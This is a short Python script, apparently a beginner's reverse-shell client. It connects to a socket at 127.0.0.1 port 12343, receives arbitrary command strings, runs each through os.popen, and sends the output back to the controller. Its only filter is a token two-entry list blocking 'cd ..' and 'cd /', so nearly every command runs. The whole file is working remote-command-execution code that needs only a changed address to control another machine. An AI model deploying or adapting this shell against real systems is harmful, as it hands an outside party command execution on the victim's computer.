import socket
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",12343)) # use socket.gethostname() to use in local network

NOTALLOWED = ['cd ..', 'cd /']


while True:
    msg = str(s.recv(1024).decode("utf-8"))
    print(msg)
    print("Got it...")
    if msg not in NOTALLOWED:
        terminal = os.popen(msg).read()
        s.send(bytes(terminal,"utf-8"))
        print("Done.")
    else:
        print("Sorry I can't")
        s.send(bytes("Sorry I can't","utf-8"))
